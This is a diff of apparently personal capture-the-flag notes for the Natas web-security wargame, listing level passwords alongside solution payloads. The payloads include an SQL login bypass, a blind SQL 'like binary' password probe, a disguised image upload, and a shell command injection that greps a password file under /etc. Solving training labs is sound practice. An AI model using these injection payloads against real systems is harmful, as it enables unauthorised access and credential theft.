@@ -13,4 +13,7 @@
 12 - EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 - upload nata10
 13 - jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY - upload b'\xFF\xD8\xFF\xE0' + nata10
 14 - Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 - /?debug&username="%20or%20"1"%20=%20"1"%20--%20&password=
-15 - AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J - 
+15 - AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J - /?debug&username=natas16"%20and%20password%20like%20binary%20%20%20"W%
+16 - WaIHEacj63wnNIBROHeqi3p9t0m5nhmh - /?needle=doomed$(grep ' + char + ' /etc/natas_webpass/natas17)
+17 - 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw - 
+18 -  -
